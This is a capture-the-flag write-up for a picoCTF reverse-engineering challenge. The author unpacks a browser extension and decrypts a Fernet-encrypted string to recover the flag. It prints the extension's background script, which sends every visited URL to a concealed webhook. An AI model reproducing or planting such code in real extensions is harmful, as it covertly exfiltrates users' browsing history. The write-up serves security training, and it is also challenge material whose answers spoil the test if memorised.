# The Add/On Trap #

## Overview ##

Difficulty: Medium

Category: [Reverse Engineering](../)

Tags: `#reverseengineering #plugin #xpi #cryptography #fernet #base64`

## Description ##

What kind of information can an Add/On reach? Is it possible to exfiltrate them without me noticing? Do they really do what they say? Most importantly, when to eat? 
These and many other questions Add/On users should be asking themselves. 
Download the provided browser extension and inspect it to uncover the hidden flag:
- Download the .xpi, password picoctf

## Approach ##

Downloading the challenge archive and extract the contents using the password provided:

    $ unzip suspicious.zip 
    Archive:  suspicious.zip
    [suspicious.zip] 56102ec0438646c68605-1.0.xpi password: 
      inflating: 56102ec0438646c68605-1.0.xpi  

`xpi` extension files are zip archives, so again using `unzip` to extract the extension files:

    $ unzip 56102ec0438646c68605-1.0.xpi
    Archive:  56102ec0438646c68605-1.0.xpi
      inflating: manifest.json           
      inflating: popup.html              
      inflating: icons/icon-64.png       
      inflating: icons/icon-32.png       
      inflating: assets/styles.css       
      inflating: assets/script.js        
      inflating: background/main.js      
      inflating: META-INF/cose.manifest  
      inflating: META-INF/cose.sig       
      inflating: META-INF/manifest.mf    
      inflating: META-INF/mozilla.sf     
      inflating: META-INF/mozilla.rsa    

Inspecting each of the source files that may be typically of hiding a flag in some way or other we find the following:

    $ cat background/main.js 
    // Secret key must be 32 url-safe base64-encoded bytes!
    // TODO I must find a solution to remove the key from here, for now I'll leave it there because I need it to encrypt the webhook

    function logOnCompleted(details) {
        console.log(`Information to exfiltrate: ${details.url}`);
        const key="cGljb0NURnt5b3UncmUgb24gdGhlIHJpZ2h0IHRyYX0="
        const webhookUrl='gAAAAABmfRjwFKUB-X3GBBqaN1tZYcPg5oLJVJ5XQHFogEgcRSxSis1e4qwicAKohmjqaD-QG8DIN5ie3uijCVAe3xiYmoEHlxATWUP3DC97R00Cgkw4f3HZKsP5xHewOqVPH8ap9FbE'
        const payload = {
            content: `${details.url}`
        };
        fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        })
        .then(response => {
            if (response.status != 204) {
                throw `Unable to complete the extraction!`;
            }
            return response;
        });
    }

    browser.webNavigation.onCompleted.addListener(logOnCompleted);

The `key` constant can be decoded using `base64`:

    $ echo "cGljb0NURnt5b3UncmUgb24gdGhlIHJpZ2h0IHRyYX0=" | base64 -d
    picoCTF{you're on the right tra}

Appearing similar to the picoCTF flag nomenclature, but this isn't our flag.

This however forms the key for use in [Fernet Symmetrical Encryption](https://cryptography.io/en/latest/fernet/), with the encrypted text in the `webhookUrl` constant.

## Solution ##

Using `python` and the `key` above, use the Fernet library to decrypt the `webhookUrl` constant.

    $ python3
    Python 3.10.12 (main, Mar  3 2026, 11:56:32) [GCC 11.4.0] on linux
    Type "help", "copyright", "credits" or "license" for more information.
    >>> from cryptography.fernet import Fernet
    >>> key = "cGljb0NURnt5b3UncmUgb24gdGhlIHJpZ2h0IHRyYX0="
    >>> f = Fernet(key)
    >>> f.decrypt("gAAAAABmfRjwFKUB-X3GBBqaN1tZYcPg5oLJVJ5XQHFogEgcRSxSis1e4qwicAKohmjqaD-QG8DIN5ie3uijCVAe3xiYmoEHlxATWUP3DC97R00Cgkw4f3HZKsP5xHewOqVPH8ap9FbE")
    b'picoCTF{...........redacted.............}'
    >>> quit()

Where the actual flag value has been redacted for the purposes of this write up.
